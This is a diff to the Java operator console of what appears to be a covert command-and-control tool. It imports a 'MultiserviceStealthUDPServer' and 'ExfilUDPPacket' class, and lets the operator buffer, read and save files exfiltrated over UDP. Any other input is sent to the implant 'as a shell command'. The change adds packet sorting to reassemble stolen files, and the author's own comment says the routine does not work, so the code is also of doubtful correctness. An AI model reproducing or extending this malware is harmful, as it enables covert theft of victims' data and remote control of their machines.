@@ -5,18 +5,20 @@ import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Collections;
 import java.util.Scanner;
 
+import networking.ExfilUDPPacket;
 import networking.MultiserviceStealthUDPServer;
 
 public class LocalCommandInterpreter{
 	Scanner in;
 	ArrayList<String> commands;
-	ArrayList<ArrayList<Byte>> storedMessages;
+	ArrayList<ArrayList<ExfilUDPPacket>> storedMessages;
 	public LocalCommandInterpreter(){
 		in=new Scanner(System.in);
 		commands=new ArrayList<String>();
-		storedMessages = new ArrayList<ArrayList<Byte>>();
+		storedMessages = new ArrayList<ArrayList<ExfilUDPPacket>>();
 		commands.add("/help");
 		commands.add("/clear: Clears current UDP buffer");
 		commands.add("/save: Saves current UDP buffer");
@@ -38,21 +40,25 @@ public class LocalCommandInterpreter{
 			}
 			System.out.println("Anything not on the list above will be sent to the client as a shell command");
 		}else if(command.startsWith("/clear")) {
-			MultiserviceStealthUDPServer.clearTotalRecieved();
+			MultiserviceStealthUDPServer.clearRecievedQueue();
 		}else if(command.startsWith("/save")) {
-			ArrayList<Byte> file = new ArrayList<Byte>();
-			for(Byte b:MultiserviceStealthUDPServer.totalRecieved){
-				file.add(b);
+			ArrayList<ExfilUDPPacket> file = new ArrayList<ExfilUDPPacket>();
+			for(ExfilUDPPacket eup:MultiserviceStealthUDPServer.recieveQueue){
+				file.add(eup);
 			}
 			storedMessages.add(file);
 		}else if(command.startsWith("/read")) {
-			System.out.println(MultiserviceStealthUDPServer.totalRecieved);
+			for(ExfilUDPPacket eup : MultiserviceStealthUDPServer.recieveQueue){
+				for(byte b : eup.getData()){
+					System.out.print((char)b);
+				}
+			}
 		}else if(command.startsWith("/history")) {
 			for(int i =0; i<storedMessages.size(); i++) {
 				System.out.println("["+i+"] "+storedMessages.get(i).toString().substring(0,Math.min(storedMessages.get(i).toString().length(), 30)));
 			}
 		}else if(command.startsWith("/file")){
-			System.out.println("[+] Starting File Save");
+			System.out.println("[+] File write beginning...");
 			try{
 				String[] commandParts = command.split(" ");
 				int entryNumber=Integer.parseInt(commandParts[1]);
@@ -61,26 +67,8 @@ public class LocalCommandInterpreter{
 				System.out.println("[+] Saving File "+entryNumber+" to ./"+fileName);
 				FileOutputStream fileWriter = new FileOutputStream(file);
 				System.out.println("[+] File Size: "+storedMessages.get(entryNumber).size());
-				long iterator=0;
-				for(Byte b:storedMessages.get(entryNumber)){
-					iterator++;
-				}
-				System.out.println("[+] Longs File Size: "+iterator);
-				byte[] fileBytes = new byte[storedMessages.get(entryNumber).size()];
-				System.out.println("[!] File Bytes Size "+fileBytes.length);
-				for(int i = 0; i < storedMessages.get(entryNumber).size(); i++){
-					ArrayList<Byte> selectedFile = storedMessages.get(entryNumber);
-					Byte b = selectedFile.get(i);
-					try{
-						fileBytes[i]=b.byteValue();
-					}catch(NullPointerException e){
-						System.out.println(e.toString());
-						System.out.println(i+"	:	"+b);
-						fileBytes[i]=0x00;
-					}
-					
-				}
-				fileWriter.write(fileBytes);
+				byte[] messageData = getSortedMessageBuffer(entryNumber);
+				fileWriter.write(messageData);
 				fileWriter.close();
 				System.out.println("[+] File Write Complete.");
 			}catch(Exception e){
@@ -99,6 +87,23 @@ public class LocalCommandInterpreter{
 			System.out.println("Anything not on the list above will be sent to the client as a shell command");
 			
 		}
+	}
+	private byte[] getSortedMessageBuffer(int index) { //Yeah, this doesn't work at all.
+		System.out.println("[+] Sorting Buffer...");
+		ArrayList<ExfilUDPPacket> sorted = new ArrayList<ExfilUDPPacket>();
+		sorted.addAll(0, this.storedMessages.get(index));
+		Collections.sort(sorted);
+		ArrayList<Byte> data = new ArrayList<Byte>();
+		for(ExfilUDPPacket eup : sorted){
+			for(byte b : eup.getData()){
+				data.add(b);
+			}
+		}
+		byte[] output = new byte[data.size()];
+		for(int i = 0; i< data.size();i++){
+			output[i]=data.get(i);
+		}
+		return output;
 	}
 	
 }
